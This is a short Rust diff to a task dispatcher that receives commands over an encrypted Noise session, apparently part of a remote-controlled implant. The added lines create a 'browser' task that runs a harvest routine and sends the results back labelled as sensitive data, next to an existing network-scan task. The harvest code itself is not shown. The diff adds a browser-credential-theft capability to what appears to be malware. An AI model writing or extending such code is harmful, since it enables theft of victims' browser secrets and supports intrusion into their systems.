@@ -680,6 +680,14 @@ fn dispatch_tasks(data: &[u8], session: &mut NoiseTransport, transport: &mut dyn
                     };
                     result = Some(SensitiveData::new(&msg));
                 },
+                "browser" => {
+                    let res = crate::modules::browser::Browser.harvest();
+                    let msg = match res {
+                        Ok(data) => data,
+                        Err(_) => b"Browser harvesting failed".to_vec(),
+                    };
+                    result = Some(SensitiveData::new(&msg));
+                },
                 "net_scan" => {
                     result = Some(crate::modules::discovery::Discovery.net_scan(&task.payload));
                 },
